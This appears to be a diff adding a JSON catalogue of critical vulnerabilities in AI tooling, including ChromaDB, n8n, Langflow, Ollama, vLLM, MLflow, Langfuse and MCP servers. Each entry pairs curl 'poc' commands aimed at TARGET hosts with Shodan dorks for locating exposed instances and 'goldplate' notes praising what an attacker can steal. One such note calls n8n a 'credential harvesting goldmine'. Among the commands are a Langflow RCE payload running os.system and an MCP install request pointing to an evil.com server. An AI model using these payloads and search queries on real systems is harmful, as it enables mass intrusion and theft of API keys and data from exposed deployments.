@@ -1,0 +1,226 @@
+{
+  "CVE-2026-45829_ChromaToast_ChromaDB": {
+    "cve": "CVE-2026-45829",
+    "name": "ChromaToast",
+    "cvss": 10.0,
+    "description": "Pre-auth RCE in ChromaDB via malicious HuggingFace model",
+    "affected": "ChromaDB 1.0.0 - 1.5.8",
+    "attack_vector": "Send malicious model config to ChromaDB FastAPI server, no auth required",
+    "endpoints": [
+      "/api/v1/collections",
+      "/api/v1/heartbeat",
+      "/api/v2/collections"
+    ],
+    "poc_commands": [
+      "# Detection - Check if ChromaDB is exposed",
+      "curl -s http://TARGET:8000/api/v1/heartbeat",
+      "curl -s http://TARGET:8000/api/v1/version",
+      "# List collections (no auth)",
+      "curl -s http://TARGET:8000/api/v1/collections",
+      "# Exploit: Create collection with malicious embedding function",
+      "curl -X POST http://TARGET:8000/api/v1/collections -H 'Content-Type: application/json' -d '{\"name\":\"poc_test\",\"get_or_create\":true}'"
+    ],
+    "shodan_dorks": [
+      "http.title:\"Chroma\" port:8000",
+      "port:8000 \"chroma\" \"api/v1\"",
+      "http.html:\"ChromaDB\" port:8000"
+    ],
+    "goldplate": "ChromaDB is typically deployed without auth in AI pipelines. An attacker can inject poisoned embeddings into ALL downstream RAG queries \u2014 persistent AI supply chain attack that survives patches."
+  },
+  "CVE-2026-21858_Ni8mare_n8n": {
+    "cve": "CVE-2026-21858",
+    "name": "Ni8mare",
+    "cvss": 10.0,
+    "description": "Unauthenticated RCE in n8n via content-type confusion in webhook request handling",
+    "affected": "n8n < 1.121.0",
+    "attack_vector": "Send crafted webhook request with manipulated Content-Type to trigger file read then RCE chain",
+    "endpoints": [
+      "/webhook/",
+      "/webhook-test/",
+      "/api/v1/workflows",
+      "/api/v1/credentials"
+    ],
+    "poc_commands": [
+      "# Detection - Check n8n version",
+      "curl -s http://TARGET:5678/api/v1/environment",
+      "# Check if webhooks are accessible",
+      "curl -s http://TARGET:5678/webhook/",
+      "# List workflows (may require auth)",
+      "curl -s http://TARGET:5678/api/v1/workflows",
+      "# Ni8mare: Content-type confusion for file read",
+      "curl -X POST http://TARGET:5678/webhook/test -H 'Content-Type: multipart/form-data' -d 'test'"
+    ],
+    "shodan_dorks": [
+      "http.title:\"n8n\" port:5678",
+      "port:5678 \"n8n\"",
+      "http.html:\"n8n\" \"workflow\""
+    ],
+    "goldplate": "n8n workflows often contain API keys, OAuth tokens, and database credentials. Compromising one n8n instance gives access to ALL connected services \u2014 credential harvesting goldmine."
+  },
+  "CVE-2026-33017_Langflow_RCE": {
+    "cve": "CVE-2026-33017",
+    "name": "Langflow RCE",
+    "cvss": 9.8,
+    "description": "Unauthenticated RCE via build_public_tmp endpoint",
+    "affected": "Langflow <= 1.8.1",
+    "attack_vector": "POST to /api/v1/build/public_tmp with malicious Python code",
+    "endpoints": [
+      "/api/v1/build/public_tmp",
+      "/api/v1/config",
+      "/api/v1/flows",
+      "/login"
+    ],
+    "poc_commands": [
+      "# Detection",
+      "curl -s http://TARGET:7860/api/v1/config",
+      "curl -s http://TARGET:7860/login",
+      "# Check version",
+      "curl -s http://TARGET:7860/api/v1/config | jq .version",
+      "# Exploit: Unauthenticated RCE",
+      "curl -X POST http://TARGET:7860/api/v1/build/public_tmp -H 'Content-Type: application/json' -d '{\"code\":\"import os;os.system(\\\"id\\\")\"}'"
+    ],
+    "shodan_dorks": [
+      "http.title:\"Langflow\" port:7860",
+      "port:7860 \"langflow\"",
+      "http.html:\"Langflow\" \"api/v1\""
+    ],
+    "goldplate": "Langflow instances contain API keys for OpenAI, Anthropic, AWS, and database connections. Exploited within 20 hours of disclosure. Attackers deploy KeyHunter to harvest ALL keys systematically."
+  },
+  "CVE-2026-7482_Bleeding_Llama_Ollama": {
+    "cve": "CVE-2026-7482",
+    "name": "Bleeding Llama",
+    "cvss": 9.1,
+    "description": "Heap OOB read in Ollama allows unauthenticated memory leak \u2014 exfiltrates API keys, prompts, credentials",
+    "affected": "Ollama < 0.6.6",
+    "attack_vector": "Crafted GGUF model file that triggers heap OOB read, leaking entire process memory including API keys",
+    "endpoints": [
+      "/api/tags",
+      "/api/show",
+      "/api/generate",
+      "/api/chat",
+      "/api/pull"
+    ],
+    "poc_commands": [
+      "# Detection - Check Ollama version",
+      "curl -s http://TARGET:11434/api/tags",
+      "# List available models (no auth)",
+      "curl -s http://TARGET:11434/api/tags | jq .",
+      "# Check version",
+      "curl -s http://TARGET:11434/api/version",
+      "# Memory leak via crafted model",
+      "curl -X POST http://TARGET:11434/api/generate -d '{\"model\":\"llama3\",\"prompt\":\"test\"}'"
+    ],
+    "shodan_dorks": [
+      "\"Ollama is running\" port:11434",
+      "port:11434 http.html:\"Ollama\"",
+      "port:11434 \"api/tags\""
+    ],
+    "goldplate": "175,000+ Ollama instances exposed. The GGUF format itself becomes a covert channel for memory exfiltration. This is a NEW attack pattern \u2014 using the model binary format as exfiltration vector."
+  },
+  "CVE-2026-22778_vLLM_RCE": {
+    "cve": "CVE-2026-22778",
+    "name": "vLLM Video RCE",
+    "cvss": 9.8,
+    "description": "RCE in vLLM via malicious video URL in multimodal inference",
+    "affected": "vLLM < 0.7.3",
+    "attack_vector": "Send malicious video URL to vLLM multimodal endpoint, triggers heap overflow in JPEG2000 decoder",
+    "endpoints": [
+      "/v1/models",
+      "/v1/chat/completions",
+      "/health",
+      "/metrics"
+    ],
+    "poc_commands": [
+      "# Detection",
+      "curl -s http://TARGET:8000/v1/models",
+      "# Check if multimodal is enabled",
+      "curl -s http://TARGET:8000/v1/models | jq '.data[].id'",
+      "# Health check",
+      "curl -s http://TARGET:8000/health"
+    ],
+    "shodan_dorks": [
+      "port:8000 \"openai\" \"model\"",
+      "http.title:\"FastAPI\" port:8000 \"v1/models\"",
+      "\"/v1/chat/completions\" port:8000"
+    ],
+    "goldplate": "vLLM is the backbone of many LLM serving deployments. RCE here means full GPU cluster compromise \u2014 attackers can steal model weights worth millions."
+  },
+  "CVE-2025-11201_MLflow_RCE": {
+    "cve": "CVE-2025-11201",
+    "name": "MLflow Dir Traversal RCE",
+    "cvss": 9.8,
+    "description": "Unauthenticated RCE via directory traversal in model artifact upload",
+    "affected": "MLflow < 2.18.0",
+    "attack_vector": "Upload malicious ZIP with path traversal filenames to achieve arbitrary file write \u2192 RCE",
+    "endpoints": [
+      "/ajax-api/2.0/mlflow/runs",
+      "/ajax-api/2.0/mlflow/artifacts",
+      "/api/2.0/mlflow/experiments/search"
+    ],
+    "poc_commands": [
+      "# Detection",
+      "curl -s http://TARGET:5000/ajax-api/2.0/mlflow/experiments/search",
+      "# List experiments (no auth)",
+      "curl -s http://TARGET:5000/api/2.0/mlflow/experiments/search",
+      "# Check version",
+      "curl -s http://TARGET:5000/ajax-api/2.0/mlflow/runs/search"
+    ],
+    "shodan_dorks": [
+      "http.title:\"MLflow\" port:5000",
+      "port:5000 \"mlflow\"",
+      "http.html:\"mlflow\" \"experiments\""
+    ],
+    "goldplate": "MLflow instances often contain proprietary model artifacts, training data, and experiment metadata. Compromising MLflow = stealing the entire ML pipeline of an organization."
+  },
+  "CVE-2026-41487_Langfuse_Auth_Bypass": {
+    "cve": "CVE-2026-41487",
+    "name": "Langfuse Auth Bypass",
+    "cvss": 8.8,
+    "description": "Low-privileged members can expose LLM API keys through malicious baseUrl",
+    "affected": "Langfuse < 2.15.4",
+    "attack_vector": "Low-privileged member sets malicious baseUrl to capture other users' API keys and prompts",
+    "endpoints": [
+      "/api/public/ingest",
+      "/api/auth/session",
+      "/api/traces"
+    ],
+    "poc_commands": [
+      "# Detection",
+      "curl -s http://TARGET:3000/api/public/ingest",
+      "curl -s http://TARGET:3000/api/auth/session"
+    ],
+    "shodan_dorks": [
+      "http.title:\"Langfuse\" port:3000",
+      "port:3000 \"langfuse\""
+    ],
+    "goldplate": "Langfuse is an LLM observability platform that LOGS ALL conversations and API keys. A single auth bypass exposes every user's LLM interactions including prompts, completions, and embedded secrets."
+  },
+  "MCP_CVE_Collection": {
+    "cves": [
+      "CVE-2025-49596",
+      "CVE-2026-33032",
+      "CVE-2025-53967",
+      "CVE-2026-23744",
+      "CVE-2026-25536",
+      "CVE-2025-68145"
+    ],
+    "name": "MCP Server Vulnerabilities",
+    "cvss_range": "9.4-9.8",
+    "description": "Multiple critical RCE and data leak vulnerabilities in MCP (Model Context Protocol) servers",
+    "affected": "Various MCP implementations",
+    "attack_vector": "Multiple: malicious MCP server \u2192 code execution during inspection, missing auth middleware, command injection in Figma URLs, debug endpoints on 0.0.0.0",
+    "poc_commands": [
+      "# Detection - Check for exposed MCP servers",
+      "curl -s http://TARGET:3001/sse",
+      "curl -s http://TARGET:8080/mcp",
+      "# MCPJam Inspector RCE",
+      "curl -X POST http://TARGET:3001/api/mcp/install -H 'Content-Type: application/json' -d '{\"server_url\":\"http://evil.com/mcp\"}'"
+    ],
+    "shodan_dorks": [
+      "http.html:\"mcp-server\" \"server-sent-events\"",
+      "port:3001 \"mcp\"",
+      "http.title:\"MCP Inspector\""
+    ],
+    "goldplate": "MCP is THE new universal attack surface. 150M+ downloads affected. MCP has become the 'default credential' of AI \u2014 everyone uses it, nobody secures it. This is the biggest unpatched attack surface in AI in 2026."
+  }
+}
